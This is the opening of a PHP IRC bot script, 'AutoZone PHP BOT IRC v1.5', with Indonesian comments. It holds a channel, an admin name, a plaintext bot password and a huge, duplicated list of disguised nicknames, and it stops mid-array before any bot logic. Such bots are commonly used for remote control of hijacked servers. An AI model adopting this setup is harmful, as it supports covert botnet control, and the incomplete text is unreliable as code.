<?php
/*
+-------------------------------------+
|#####################################|
|#[ AutoZone PHP BOT IRC v1.5        ]#|
|#[ By ^SoNiC^l                 ]#|
|#[  2011                       ]#|
|#[ irc: #mmc@allnetwork.org    ]#|
|#####################################|
+-------------------------------------+
*/

function rx() {

/* Channel Bot */
$channels = '#bandila'; // chanell pisahkan dengan spasi

/*** Admin ***/
$admin = 'bandila';
$bot_password = 'kodo'; //Password untuk auth bot

$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$showrespone = 0; //1, Nampilin respon dari server irc

//Nick Bot
$nicklist = array(
"`FranSiska`","`TIto-Louis`","`CaciNG`","`SeNo-Aja`","`BuDi`","`MuLYaDI`","`MuLYoNo`","`MuLYaNtO`","`SuGI-DoaNK`","`AdI-TY`","`^GURU^`","`RaHaXiA`","`Strik3`","`Rivany`","`Ivanya`","`Indahyanti`","`S3k3l3t0n`","`OcTaViA`","`BajinguK`","`Recht_77`","`CrawLeRz`","`MeSseNGeRz`","`ce_vinka`","`ce-zhibond`","`Amrik`","`ce-gaulzz`","`ce_assykz`","`ce_ivkana`","`ce-bispak-nih`","`ce-apa_danya`","`Alinawati`","`Aldah`","`Alikhus`",
"`Aleks`","`alibana`","`ce-murah-loh`","`ce_phone-aja`","`ce-diapain_mau`","`ce_diAtasOkBwkhOK`","`ce_sipanan`","`ce-30-anksatu`","`sherrlyy`","`siampudan`","`co_Kaya-raya`","`co_gentel-man`",
"`Ando`","`ce_andarist`","`cwexks`","`luptah`","`lidawti`","`Riantiwti`","`Rimbunwan`","`co_gkarda`","`co-PDIP`","`co_mantan_atlet`","`co-taekwondo`","`co_karateka`","`co-bispak`","`ce_taekwondo`",
"`Augustus`","`Aurelius`","`Axel-ros`","`vridawani`","`co-22-lajang`","`co-23_duda`","`co_cak-c0`","`Azima_rohana`","`Rohaniah`","`Rok-Q-miniloh`","`Bad_garls`","`ce_mau-itu`","`ce-o818xxx`",
"`co_vixion`","`co_mio-club`","`ce_bejad`","`ce_pengen-vixion`","`ce_matrezxks`","`ce-frees`","`co_matreksz`","`ronaldinhos`","`alan-smith`","`davidenco`","`co-br-gajian`","`ce-PNS`","`co_PNS`",
"`co-Polisi22`","`co-TNI24`","`co_pol-cr-istri`","`coKukawin`","`ridwanss`","`co_siangktars`","`ce_Bertato`","`ce-ber`","`co_tatoan`","`ahli_cignta`","`christies`","`ce_perum`","`ce-parlu`",
"`ce-simal`","`ce_btxx-toba`","`ce-tarutung`","`ce_cari-cew`","`ce-fitnes`","`co_fitkgness`","`pria-idaman`","`wanigta31`","`cwe-5-kger`","`cwe2_kgul`","`ce-cari_ker`","`jandaAnkdua22`","`jandaKaya`",
"`ce_muda_cr-ker`","`ce_sendirianlah`","`ce_kpngn-sndri`","`ce-lg-kesal`","`ce_^signgle`","`Bonagrdo`","`Darwintegna`","`Johan-Kerens`","`Johan_setia`","`Betti-sendri`","`bernards`","`co-riana`",
"`co_cindy`","`co_happies`","`JohanLuvHap`","`ce-bisa_ngamar`","`ce-tajor`","`ce_ayo`","`vi^da`","`rEvna^_^`","`revina`","`ce-sksd`","`ce-deal`","`ce-bs-phone_sx`","`ce-vonny`","`cweksi`",
"`c_u-there`","`ce-ml`","`ce-sinta`","`Zinta^OK^`","`Sheta_mnis`","`SiNtia_^`","`sRi-Relawati`","`Bonar_gultom`","`Beny_simbolon`","`Boy_HP`","`Boy-Band`","`Rian_FS-Fb`","`ce_sk-FB`","`Ce-cr-Kwn-FS`",
"`ce-Cr-Kwn-FB`","`Dhalia-Sinaga`","`Aprina_Gerlz`","`Ce_imutsz`","`ce_bth-ang`","`ce-buuh_itu`","`ce-Mau-uang`","`ce-Mau-SK`","`ce_huGos`","`ce_cafes`","`ce_cubs`","`ce_dgemsan`","`ce-tgh_ml`","`Boy-ugos`",
"`fresco_man`","`FB-FS-yuk`","`Bela-Caemsz`","`Bel_ce`","`Bek-Kang`","`belA-shakpir`","`belA-Lang`","`Bolangs^`","`PtualangGirl`","`ce_gunung`","`ce_Mapala`","`ce_Repala`","`Ce-Katliksz`","`ce_Pro-tes_tan`",
"`ce_nya-Rkandy`","`Ce-nkya_zia`","`Fauziah_imuts`","`Fauzi_Badawi`","`Indo_neskia`","`Indah_manja`","`Indah_skali`","`Inda_simal`","`Inah_Toba`","`Inda_PakPak`","`Boy_sdklng`","`Rando_simarata`","`Roma_lina`","`Roma_RoaNa`","`Roma_tuJabu`",
"`Roma_ktson`","`RohkaMaHo`","`Robin_pardkede`","`Ronal_pandiangkan`","`Rebekkka_tarkigan`","`Re2-Mutz`","`Re2_maniz`","`Re2caems`","`Re2_sihotang`","`Re2_bakkara`","`Re2_do_mi`","`Pardosha`","`VarDscha`",
"`Cryliton`","`Carli_simanjoang`","`ce-mutzzz`","`ce_mtzz^ah`","`PainKa`","`siJambul`","`Gernimooo`","`ryand_`","`ery_ssan`","`Andara_early`","`Nindi_elis`","`lee_ana`","`lee_ani`","`lea_na`","`ce_gokl_abs`","`ce-mataduit`",
"`ce_bispak-nih`","`ce-081846732`","`ce-jogja`","`ce-marihat`","`ce-kuliahanSTT`","`ce-ajalah`","`ce_jaom`","`ce-jelok`","`happyku`","`co_perjaka_tengteng`","`pengemis_cinta`","`cinta_matamu`","`cium_akulah`",
"`maria_aaa`","`ce_Zhindha`","`ce__Vhita`","`ce_Vintha`","`ahli-nujum`","`fifitsss`","`fafiiiii`","`kakek_buyud`","`clinKXZ`","`Verdaves`","`vAldeZz`","`Darwin_boy`","`boy_Darwin`","`pak_aldez`",
"`cinta-mulia`","`yan`","`BikeI`","`OudoW`","`cinta-ku`","`ahhh_tak`","`ce_betul`","`ce-baik-loh`","`GabruZZ`","`cempStr`","`ceXA-Mdn`","`mamaaaaaa`","`starOne`","`Flash-Com`","`Johan_ES`","`malaka`","`TrinoO`",
"`MUNGA_BUNGA`","`bunga_citra`","`SnifferS`","`Sniffit`","`sniffot`","`ahh-begulah`","`Miduks`","`malaikat_berjilbab`","`papa_melky`","`simalingKu`","`AkuYA`","`lah_mananya`","`sayang_u`","`cita-U`","`co_cas-sejati`",
"`nindyalala`","`chintialala`","`krisnalala`","`verawati-la`","`sianktarlahhh`","`flashcomlah`","`johanglahh`","`siapgalahh`","`akulah`","`kogok_mabok`","`kodok_jeleks`","`kodok-caem`","`ce-cacem`","`ce_tryy`",
"`bispak_ya`","`co_cr_tantemu`","`appara`","`marialala`","`co_gantenkksss`","`co_kerensssss`","`teh-dgina`","`teh_ida`","`saroenkz`","`sly_moetz`","`dodoetzc`",
"`Zoldak`","`Zucconi`","`Zurn`","`Zwiers`","`Adams`","`Addison`","`Adelkstgein`","`Adgibe`","`Adorgno`","`Ahlegrs`","`Algavi`","`Alcogrn`","`Algda`",
"`Aleks`","`Allison`","`Alongi`","`Altavilla`","`Altenberger`","`Altenhgokfen`","`Amaral`","`Amatangelo`","`Ameer`","`Amsden`","`Anand`","`Andel`",
"`Ando`","`Andrelus`","`Andron`","`Anfinrud`","`ce_cantieq`","`ce_gua`","`Angtkos`","`Argbia`","`Ardugini`","`Arellgano`","`Aristotle`","`Arjas`","`Arky`","`Atkins`",
"`Augustus`","`Aurelius`","`Bailar`","`Bakanowsky`","`Baleja`","`Ballatori`","`Ballew`","`Baltz`","`Banta`","`Barabesi`","`Barajas`","`Baranczak`","`Baranowska`","`Barberi`","`Barbetti`",
	"`Barneson`","`Barnett`","`Barriola`","`Barry`","`Bartholomew`","`Bartolome`","`Bartoo`","`Basavappa`","`Bashevis`","`Batchelder`","`Baumiller`","`Bayles`","`Bayo`",
	"`Beacon`","`Beal`","`Bean`","`Beckman`","`Beder`","`Bedford`","`Behenna`","`Belanger`","`Belaoussof`","`Belfer`","`Belin-Collart`","`Bellavance`","`Bellhouse`",
	"`Bellini`","`Belloc`","`Benedict-Dye`","`Bergson`","`Berke-Jenkins`","`Bernardo`","`Bernassola`","`Bernston`","`Berrizbeitia`","`Betti`","`Beynart`","`Biagioli`",
	"`Bickel`","`Binion`","`Bir`","`Bisema`","`Bisho`","`Blackbourn`","`Blackwell`","`Blagg`","`Blakemore`","`Blanke`","`Bliss`","`Blizard`","`Bloch`","`Bloembergen`",
	"`Bloemhof`","`Bloxham`","`Blyth`","`Bolger`","`Bolick`","`Bollinger`","`Bologna`","`Boner`","`Bonham`","`Boniface`","`Bontempo`","`Book`","`Bookbinder`","`Boone`",
	"`Boorstin`","`Borack`","`Borden`","`Bossi`","`Bothman`","`Botosh`","`Boudin`","`Boudrot`","`Bourneuf`","`Bowers`","`Boxer`","`Boyajian`","`Boyes`","`Boyland`",
	"`Boym`","`Boyne`","`Bracalente`","`Bradac`","`Bradach`","`Brecht`","`Breed`","`Brenan`","`Brennan`","`Brewer`","`Brewer`","`Bridgeman`","`Bridges`","`Brinton`",
	"`Britz`","`Broca`","`Brook`","`Brzycki`","`Buchan`","`Budding`","`Bullard`","`Bunton`","`Burden`","`Burdzy`","`Burke`","`Burridge`","`Busetta`","`Byatt`","`Byerly`",
	"`Byrd`","`Cage`","`Calnan`","`Cammelli`","`Cammilleri`","`Canley`","`Capanni`","`Caperton`","`Capocaccia`","`Capodilupo`","`Cappuccio`","`Capursi`","`Caratozzolo`",
	"`Carayannopoulos`","`Carlin`","`Carlos`","`Carlyle`","`Carmichael`","`Caroti`","`Carper`","`Cartmill`","`Cascio`","`Case`","`Caspar`","`Castelda`","`Cavanagh`",
	"`Cavell`","`Ceniceros`","`Cerioli`","`Chapman`","`Charles`","`Cheang`","`Cherry`","`Chervinsky`","`Chiassino`","`Chien`","`Childress`","`Childs`","`Chinipardaz`",
	"`Chinman`","`Christenson`","`Christian`","`Christiano`","`Christie`","`Christopher`","`Chu`","`Chupasko`","`Church`","`Ciampaglia`","`Cicero`","`Cifarelli`",
	"`Claffey`","`Clancy`","`Clark`","`Clement`","`Clifton`","`Clow`","`Coblenz`","`Coito`","`Coldren`","`Colella`","`Collard`","`Collis`","`Compton`","`Compton`",
	"`Comstock`","`Concino`","`Condodina`","`Connors`","`Corey`","`Cornish`","`Cosmides`","`Counter`","`Coutaux`","`Crawford`","`Crocker`","`Croshaw`","`Croxen`",
	"`Croxton`","`Cui`","`Currier`","`Cutler`","`Cvek`","`Cyders`","`daSilva`","`Daldalian`","`Daly`","`D'Ambra`","`Danieli`","`Dante`","`Dapice`","`D'arcangelo`","`Das`",
	"`Dasgupta`","`Daskalu`","`David`","`Dawkins`","`DeGennaro`","`DeLaPena`","`del'Enclos`","`deRousse`","`Debroff`","`Dees`","`Defeciani`","`Delattre`","`Deleon-Rendon`",
	"`Delger`","`Dell'acqua`","`Deming`","`Dempster`","`Demusz`","`Denault`","`Denham`","`Denison`","`Desombre`","`Deutsch`","`D'fini`","`Dicks`","`Diefenbach`","`Difabio`",
	"`Difronzo`","`Dilworth`","`Dionysius`","`Dirksen`","`Dockery`","`Doherty`","`Donahue`","`Donner`","`Doonan`","`Dore`","`Dorf`","`Dosi`","`Doty`","`Doug`","`Dowsland`",
	"`Drinker`","`D'souza`","`Duffin`","`Durrett`","`Dussault`","`Dwyer`","`Eardley`","`Ebeling`","`Eckel`","`Edley`","`Edner`","`Edward`","`Eickenhorst`","`Eliasson`",
	"`Elmendorf`","`Elmerick`","`Elvis`","`Encinas`","`Enyeart`","`Eppling`","`Erbach`","`Erdman`","`Erdos`","`Erez`","`Espinoza`","`Estes`","`Etter`","`Euripides`",
	"`Everett`","`Fabbris`","`Fagan`","`Faioes`","`Falco-Acosta`","`Falorsi`","`Faris`","`Farone`","`Farren`","`Fasso'`","`Fates`","`Feigenbaum`","`Fejzo`","`Feldman`",
	"`Fernald`","`Fernandes`","`Ferrante`","`Ferriell`","`Feuer`","`Fido`","`Field`","`Fink`","`Finkelstein`","`Finnegan`","`Fiorina`","`Fisk`","`Fitzmaurice`","`Flier`",
	"`Flores`","`Folks`","`Forester`","`Fortes`","`Fortier`","`Fossey`","`Fossi`","`Francisco`","`Franklin-Kenea`","`Franz`","`Frazier-Davis`","`Freid`","`Freundlich`",
	"`Fried`","`Friedland`","`Frisken`","`Frowiss`","`Fryberger`","`Frye`","`Fujii-Abe`","`Fuller`","`Furth`","`Fusaro`","`Gabrielli`","`Gaggiotti`","`Galeotti`","`Galwey`",
	"`Gambini`","`Garfield`","`Garman`","`Garonna`","`Geller`","`Gemberling`","`Georgi`","`Gerrett`","`Ghorai`","`Gibbens`","`Gibson`","`Gilbert`","`Gili`","`Gill`","`Gillispie`",
	"`Gist`","`Gleason`","`Glegg`","`Glendon`","`Goldfarb`","`Goncalves`","`Good`","`Goodearl`","`Goody`","`Gozzi`","`Gravell`","`Greenberg`","`Greenfeld`","`Griffiths`",
	"`Grigoletto`","`Grummell`","`Gruner`","`Gruppe`","`Guenthart`","`Gunn`","`Guo`","`Ha`","`Haar`","`Hackman`","`Hackshaw`","`Haley`","`Halkias`","`Hallowell`","`Halpert`",
	"`Hambarzumjan`","`Hamer`","`Hammerness`","`Hand`","`Hanssen`","`Harding`","`Hargraves`","`Harlow`","`Harrigan`","`Hartman`","`Hartmann`","`Hartnett`","`Harwell`",
	"`Haviaras`","`Hawkes`","`Hayes`","`Haynes`","`Hazlewood`","`Heermans`","`Heft`","`Heiland`","`Hellman`","`Hellmiss`","`Helprin`","`Hemphill`","`Henery`","`Henrichs`",
	"`Hernandez`","`Herrera`","`Hester`","`Heubert`","`Heyeck`","`Himmelfarb`","`Hind`","`Hirst`","`Hitchcock`","`Hoang`","`Hock`","`Hoffer`","`Hoffman`","`Hokanson`","`Hokoda`",
	"`Holmes`","`Holoien`","`Holter`","`Holway`","`Holzman`","`Hooker`","`Hopkins`","`Horsley`","`Hoshida`","`Hostage`","`Hottle`","`Howard`","`Hoy`","`Huey`","`Huidekoper`",
	"`Hungerford`","`Huntington`","`Hupp`","`Hurtubise`","`Hutchings`","`Hyde`","`Iaquinta`","`Ichikawa`","`Igarashi`","`Inamura`","`Inniss`","`Isaac`","`Isaievych`","`Isbill`",
	"`Isserman`","`Iyer`","`Jacenko`","`Jackson`","`Jagers`","`Jagger`","`Jagoe`","`Jain`","`Jamil`","`Janjigian`","`Jarnagin`","`Jarrell`","`Jay`","`Jeffers`","`Jellis`",
	"`Jenkins`","`Jespersen`","`Jewett`","`Johannesson`","`Johannsen`","`Johns`","`Jolly`","`Jorgensen`","`Jucks`","`Juliano`","`Julious`","`Kabbash`","`Kaboolian`","`Kafadar`",
	"`Kalbfleisch`","`Kaligian`","`Kalil`","`Kalinowski`","`Kalman`","`Kamel`","`Kangis`","`Karpouzes`","`Kassower`","`Kasten`","`Kawachi`","`Kee`","`Keenan`","`Keepper`",
	"`Keith`","`Kelker`","`Kelsey`","`Kempton`","`Kemsley`","`Kendall`","`Kerry`","`Keul`","`Khong`","`Kimmel`","`Kimmett`","`Kimura`","`Kindall`","`Kinsley`","`Kippenberger`",
	"`Kirscht`","`Kittridge`","`Kleckner`","`Kleiman`","`Kleinfelder`","`Klemperer`","`Kling`","`Klinkenborg`","`Klint`","`Knuff`","`Kobrick`","`Koch`","`Kohn`","`Koivumaki`",
	"`Kommer`","`Koniaris`","`Konrad`","`Kool`","`Korzybski`","`Kotter`","`Kovaks`","`Kraemer`","`Krailo`","`Krasney`","`Kraus`","`Kroemer`","`Krysiak`","`Kuenzli`","`Kumar`",
	"`Kusman`","`Kuwabara`","`La`","`Labunka`","`Lafler`","`Laing`","`Lallemant`","`Landes`","`Lankes`","`Lantieri`","`Lanzit`","`Laserna`","`Lashley`","`Lawless`","`Lecar`",
	"`Lecce`","`Leclercq`","`Leite`","`Lenard`","`Sofia`","`Lesser`","`Lessi`","`Liakos`","`Lidano`","`Liem`","`Light`","`Lightfoot`","`Lim`","`Linares`","`Linda`","`Linder`",
	"`Line`","`Linehan`","`Linzee`","`Lippmann`","`Lipponen`","`Little`","`Litvak`","`Livernash`","`Livi`","`Livolsi`","`Lizardo`","`Locatelli`","`Longworth`","`Loss`","`Loveman`",
	"`Lowenstein`","`Loza`","`Lubin`","`Lucas`","`Luciano`","`Luczkow`","`Luecke`","`Lunetta`","`Luoma`","`Lussier`","`Lutcavage`","`Luzader`","`Ma`","`Maccormac`","`Macdonald`",
	"`Maceachern`","`Macintyre`","`Mackenney`","`MacMillan`","`Macy`","`Madigan`","`Maggio`","`Mahony`","`Maier`","`Maine-Hershey`","`Maisano`","`Malatesta`","`Maller`",
	"`Malova`","`Manalis`","`Mandel`","`Manganiello`","`Mantovan`","`March`","`Marchbanks`","`Marcus`","`Margalit`","`Margetts`","`Marques`","`Martinez`","`Martochio`",
	"`Marton`","`Marubini`","`Mass`","`Matalka`","`Matarazzo`","`Matsukata`","`Mattson`","`Mauzy`","`May`","`Mazzali`","`Mazziotta`","`Mcbride`","`Mccaffery`","`Mccall`",
	"`FranSiska`","`TIto-Louis`","`CaciNG`","`SeNo-Aja`","`BuDi`","`MuLYaDI`","`MuLYoNo`","`MuLYaNtO`","`SuGI-DoaNK`","`AdI-TY`","`^GURU^`","`RaHaXiA`","`Strik3`","`Rivany`","`Ivanya`","`Indahyanti`","`S3k3l3t0n`","`OcTaViA`","`BajinguK`","`Recht_77`","`CrawLeRz`","`MeSseNGeRz`","`ce_vinka`","`ce-zhibond`","`Amrik`","`ce-gaulzz`","`ce_assykz`","`ce_ivkana`","`ce-bispak-nih`","`ce-apa_danya`","`Alinawati`","`Aldah`","`Alikhus`",
"`Aleks`","`alibana`","`ce-murah-loh`","`ce_phone-aja`","`ce-diapain_mau`","`ce_diAtasOkBwkhOK`","`ce_sipanan`","`ce-30-anksatu`","`sherrlyy`","`siampudan`","`co_Kaya-raya`","`co_gentel-man`",
"`Ando`","`ce_andarist`","`cwexks`","`luptah`","`lidawti`","`Riantiwti`","`Rimbunwan`","`co_gkarda`","`co-PDIP`","`co_mantan_atlet`","`co-taekwondo`","`co_karateka`","`co-bispak`","`ce_taekwondo`",
"`Augustus`","`Aurelius`","`Axel-ros`","`vridawani`","`co-22-lajang`","`co-23_duda`","`co_cak-c0`","`Azima_rohana`","`Rohaniah`","`Rok-Q-miniloh`","`Bad_garls`","`ce_mau-itu`","`ce-o818xxx`",
"`co_vixion`","`co_mio-club`","`ce_bejad`","`ce_pengen-vixion`","`ce_matrezxks`","`ce-frees`","`co_matreksz`","`ronaldinhos`","`alan-smith`","`davidenco`","`co-br-gajian`","`ce-PNS`","`co_PNS`",
"`co-Polisi22`","`co-TNI24`","`co_pol-cr-istri`","`coKukawin`","`ridwanss`","`co_siangktars`","`ce_Bertato`","`ce-ber`","`co_tatoan`","`ahli_cignta`","`christies`","`ce_perum`","`ce-parlu`",
"`ce-simal`","`ce_btxx-toba`","`ce-tarutung`","`ce_cari-cew`","`ce-fitnes`","`co_fitkgness`","`pria-idaman`","`wanigta31`","`cwe-5-kger`","`cwe2_kgul`","`ce-cari_ker`","`jandaAnkdua22`","`jandaKaya`",
"`ce_muda_cr-ker`","`ce_sendirianlah`","`ce_kpngn-sndri`","`ce-lg-kesal`","`ce_^signgle`","`Bonagrdo`","`Darwintegna`","`Johan-Kerens`","`Johan_setia`","`Betti-sendri`","`bernards`","`co-riana`",
"`co_cindy`","`co_happies`","`JohanLuvHap`","`ce-bisa_ngamar`","`ce-tajor`","`ce_ayo`","`vi^da`","`rEvna^_^`","`revina`","`ce-sksd`","`ce-deal`","`ce-bs-phone_sx`","`ce-vonny`","`cweksi`",
"`c_u-there`","`ce-ml`","`ce-sinta`","`Zinta^OK^`","`Sheta_mnis`","`SiNtia_^`","`sRi-Relawati`","`Bonar_gultom`","`Beny_simbolon`","`Boy_HP`","`Boy-Band`","`Rian_FS-Fb`","`ce_sk-FB`","`Ce-cr-Kwn-FS`",
"`ce-Cr-Kwn-FB`","`Dhalia-Sinaga`","`Aprina_Gerlz`","`Ce_imutsz`","`ce_bth-ang`","`ce-buuh_itu`","`ce-Mau-uang`","`ce-Mau-SK`","`ce_huGos`","`ce_cafes`","`ce_cubs`","`ce_dgemsan`","`ce-tgh_ml`","`Boy-ugos`",
"`fresco_man`","`FB-FS-yuk`","`Bela-Caemsz`","`Bel_ce`","`Bek-Kang`","`belA-shakpir`","`belA-Lang`","`Bolangs^`","`PtualangGirl`","`ce_gunung`","`ce_Mapala`","`ce_Repala`","`Ce-Katliksz`","`ce_Pro-tes_tan`",
"`ce_nya-Rkandy`","`Ce-nkya_zia`","`Fauziah_imuts`","`Fauzi_Badawi`","`Indo_neskia`","`Indah_manja`","`Indah_skali`","`Inda_simal`","`Inah_Toba`","`Inda_PakPak`","`Boy_sdklng`","`Rando_simarata`","`Roma_lina`","`Roma_RoaNa`","`Roma_tuJabu`",
"`Roma_ktson`","`RohkaMaHo`","`Robin_pardkede`","`Ronal_pandiangkan`","`Rebekkka_tarkigan`","`Re2-Mutz`","`Re2_maniz`","`Re2caems`","`Re2_sihotang`","`Re2_bakkara`","`Re2_do_mi`","`Pardosha`","`VarDscha`",
"`Cryliton`","`Carli_simanjoang`","`ce-mutzzz`","`ce_mtzz^ah`","`PainKa`","`siJambul`","`Gernimooo`","`ryand_`","`ery_ssan`","`Andara_early`","`Nindi_elis`","`lee_ana`","`lee_ani`","`lea_na`","`ce_gokl_abs`","`ce-mataduit`",
"`ce_bispak-nih`","`ce-081846732`","`ce-jogja`","`ce-marihat`","`ce-kuliahanSTT`","`ce-ajalah`","`ce_jaom`","`ce-jelok`","`happyku`","`co_perjaka_tengteng`","`pengemis_cinta`","`cinta_matamu`","`cium_akulah`",
"`maria_aaa`","`ce_Zhindha`","`ce__Vhita`","`ce_Vintha`","`ahli-nujum`","`fifitsss`","`fafiiiii`","`kakek_buyud`","`clinKXZ`","`Verdaves`","`vAldeZz`","`Darwin_boy`","`boy_Darwin`","`pak_aldez`",
"`cinta-mulia`","`yan`","`BikeI`","`OudoW`","`cinta-ku`","`ahhh_tak`","`ce_betul`","`ce-baik-loh`","`GabruZZ`","`cempStr`","`ceXA-Mdn`","`mamaaaaaa`","`starOne`","`Flash-Com`","`Johan_ES`","`malaka`","`TrinoO`",
"`MUNGA_BUNGA`","`bunga_citra`","`SnifferS`","`Sniffit`","`sniffot`","`ahh-begulah`","`Miduks`","`malaikat_berjilbab`","`papa_melky`","`simalingKu`","`AkuYA`","`lah_mananya`","`sayang_u`","`cita-U`","`co_cas-sejati`",
"`nindyalala`","`chintialala`","`krisnalala`","`verawati-la`","`sianktarlahhh`","`flashcomlah`","`johanglahh`","`siapgalahh`","`akulah`","`kogok_mabok`","`kodok_jeleks`","`kodok-caem`","`ce-cacem`","`ce_tryy`",
"`bispak_ya`","`co_cr_tantemu`","`appara`","`marialala`","`co_gantenkksss`","`co_kerensssss`","`teh-dgina`","`teh_ida`","`saroenkz`","`sly_moetz`","`dodoetzc`",
"`Zoldak`","`Zucconi`","`Zurn`","`Zwiers`","`Adams`","`Addison`","`Adelkstgein`","`Adgibe`","`Adorgno`","`Ahlegrs`","`Algavi`","`Alcogrn`","`Algda`",
"`Aleks`","`Allison`","`Alongi`","`Altavilla`","`Altenberger`","`Altenhgokfen`","`Amaral`","`Amatangelo`","`Ameer`","`Amsden`","`Anand`","`Andel`",
"`Ando`","`Andrelus`","`Andron`","`Anfinrud`","`ce_cantieq`","`ce_gua`","`Angtkos`","`Argbia`","`Ardugini`","`Arellgano`","`Aristotle`","`Arjas`","`Arky`","`Atkins`",
"`Augustus`","`Aurelius`","`Bailar`","`Bakanowsky`","`Baleja`","`Ballatori`","`Ballew`","`Baltz`","`Banta`","`Barabesi`","`Barajas`","`Baranczak`","`Baranowska`","`Barberi`","`Barbetti`",
	"`Barneson`","`Barnett`","`Barriola`","`Barry`","`Bartholomew`","`Bartolome`","`Bartoo`","`Basavappa`","`Bashevis`","`Batchelder`","`Baumiller`","`Bayles`","`Bayo`",
	"`Beacon`","`Beal`","`Bean`","`Beckman`","`Beder`","`Bedford`","`Behenna`","`Belanger`","`Belaoussof`","`Belfer`","`Belin-Collart`","`Bellavance`","`Bellhouse`",
	"`Bellini`","`Belloc`","`Benedict-Dye`","`Bergson`","`Berke-Jenkins`","`Bernardo`","`Bernassola`","`Bernston`","`Berrizbeitia`","`Betti`","`Beynart`","`Biagioli`",
	"`Bickel`","`Binion`","`Bir`","`Bisema`","`Bisho`","`Blackbourn`","`Blackwell`","`Blagg`","`Blakemore`","`Blanke`","`Bliss`","`Blizard`","`Bloch`","`Bloembergen`",
	"`Bloemhof`","`Bloxham`","`Blyth`","`Bolger`","`Bolick`","`Bollinger`","`Bologna`","`Boner`","`Bonham`","`Boniface`","`Bontempo`","`Book`","`Bookbinder`","`Boone`",
	"`Boorstin`","`Borack`","`Borden`","`Bossi`","`Bothman`","`Botosh`","`Boudin`","`Boudrot`","`Bourneuf`","`Bowers`","`Boxer`","`Boyajian`","`Boyes`","`Boyland`",
	"`Boym`","`Boyne`","`Bracalente`","`Bradac`","`Bradach`","`Brecht`","`Breed`","`Brenan`","`Brennan`","`Brewer`","`Brewer`","`Bridgeman`","`Bridges`","`Brinton`",
	"`Britz`","`Broca`","`Brook`","`Brzycki`","`Buchan`","`Budding`","`Bullard`","`Bunton`","`Burden`","`Burdzy`","`Burke`","`Burridge`","`Busetta`","`Byatt`","`Byerly`",
	"`Byrd`","`Cage`","`Calnan`","`Cammelli`","`Cammilleri`","`Canley`","`Capanni`","`Caperton`","`Capocaccia`","`Capodilupo`","`Cappuccio`","`Capursi`","`Caratozzolo`",
	"`Carayannopoulos`","`Carlin`","`Carlos`","`Carlyle`","`Carmichael`","`Caroti`","`Carper`","`Cartmill`","`Cascio`","`Case`","`Caspar`","`Castelda`","`Cavanagh`",
	"`Cavell`","`Ceniceros`","`Cerioli`","`Chapman`","`Charles`","`Cheang`","`Cherry`","`Chervinsky`","`Chiassino`","`Chien`","`Childress`","`Childs`","`Chinipardaz`",
	"`Chinman`","`Christenson`","`Christian`","`Christiano`","`Christie`","`Christopher`","`Chu`","`Chupasko`","`Church`","`Ciampaglia`","`Cicero`","`Cifarelli`",
	"`Claffey`","`Clancy`","`Clark`","`Clement`","`Clifton`","`Clow`","`Coblenz`","`Coito`","`Coldren`","`Colella`","`Collard`","`Collis`","`Compton`","`Compton`",
	"`Comstock`","`Concino`","`Condodina`","`Connors`","`Corey`","`Cornish`","`Cosmides`","`Counter`","`Coutaux`","`Crawford`","`Crocker`","`Croshaw`","`Croxen`",
	"`Croxton`","`Cui`","`Currier`","`Cutler`","`Cvek`","`Cyders`","`daSilva`","`Daldalian`","`Daly`","`D'Ambra`","`Danieli`","`Dante`","`Dapice`","`D'arcangelo`","`Das`",
	"`Dasgupta`","`Daskalu`","`David`","`Dawkins`","`DeGennaro`","`DeLaPena`","`del'Enclos`","`deRousse`","`Debroff`","`Dees`","`Defeciani`","`Delattre`","`Deleon-Rendon`",
	"`Delger`","`Dell'acqua`","`Deming`","`Dempster`","`Demusz`","`Denault`","`Denham`","`Denison`","`Desombre`","`Deutsch`","`D'fini`","`Dicks`","`Diefenbach`","`Difabio`",
	"`Difronzo`","`Dilworth`","`Dionysius`","`Dirksen`","`Dockery`","`Doherty`","`Donahue`","`Donner`","`Doonan`","`Dore`","`Dorf`","`Dosi`","`Doty`","`Doug`","`Dowsland`",
	"`Drinker`","`D'souza`","`Duffin`","`Durrett`","`Dussault`","`Dwyer`","`Eardley`","`Ebeling`","`Eckel`","`Edley`","`Edner`","`Edward`","`Eickenhorst`","`Eliasson`",
	"`Elmendorf`","`Elmerick`","`Elvis`","`Encinas`","`Enyeart`","`Eppling`","`Erbach`","`Erdman`","`Erdos`","`Erez`","`Espinoza`","`Estes`","`Etter`","`Euripides`",
	"`Everett`","`Fabbris`","`Fagan`","`Faioes`","`Falco-Acosta`","`Falorsi`","`Faris`","`Farone`","`Farren`","`Fasso'`","`Fates`","`Feigenbaum`","`Fejzo`","`Feldman`",
	"`Fernald`","`Fernandes`","`Ferrante`","`Ferriell`","`Feuer`","`Fido`","`Field`","`Fink`","`Finkelstein`","`Finnegan`","`Fiorina`","`Fisk`","`Fitzmaurice`","`Flier`",
	"`Flores`","`Folks`","`Forester`","`Fortes`","`Fortier`","`Fossey`","`Fossi`","`Francisco`","`Franklin-Kenea`","`Franz`","`Frazier-Davis`","`Freid`","`Freundlich`",
	"`Fried`","`Friedland`","`Frisken`","`Frowiss`","`Fryberger`","`Frye`","`Fujii-Abe`","`Fuller`","`Furth`","`Fusaro`","`Gabrielli`","`Gaggiotti`","`Galeotti`","`Galwey`",
	"`Gambini`","`Garfield`","`Garman`","`Garonna`","`Geller`","`Gemberling`","`Georgi`","`Gerrett`","`Ghorai`","`Gibbens`","`Gibson`","`Gilbert`","`Gili`","`Gill`","`Gillispie`",
	"`Gist`","`Gleason`","`Glegg`","`Glendon`","`Goldfarb`","`Goncalves`","`Good`","`Goodearl`","`Goody`","`Gozzi`","`Gravell`","`Greenberg`","`Greenfeld`","`Griffiths`",
	"`Grigoletto`","`Grummell`","`Gruner`","`Gruppe`","`Guenthart`","`Gunn`","`Guo`","`Ha`","`Haar`","`Hackman`","`Hackshaw`","`Haley`","`Halkias`","`Hallowell`","`Halpert`",
	"`Hambarzumjan`","`Hamer`","`Hammerness`","`Hand`","`Hanssen`","`Harding`","`Hargraves`","`Harlow`","`Harrigan`","`Hartman`","`Hartmann`","`Hartnett`","`Harwell`",
	"`Haviaras`","`Hawkes`","`Hayes`","`Haynes`","`Hazlewood`","`Heermans`","`Heft`","`Heiland`","`Hellman`","`Hellmiss`","`Helprin`","`Hemphill`","`Henery`","`Henrichs`",
	"`Hernandez`","`Herrera`","`Hester`","`Heubert`","`Heyeck`","`Himmelfarb`","`Hind`","`Hirst`","`Hitchcock`","`Hoang`","`Hock`","`Hoffer`","`Hoffman`","`Hokanson`","`Hokoda`",
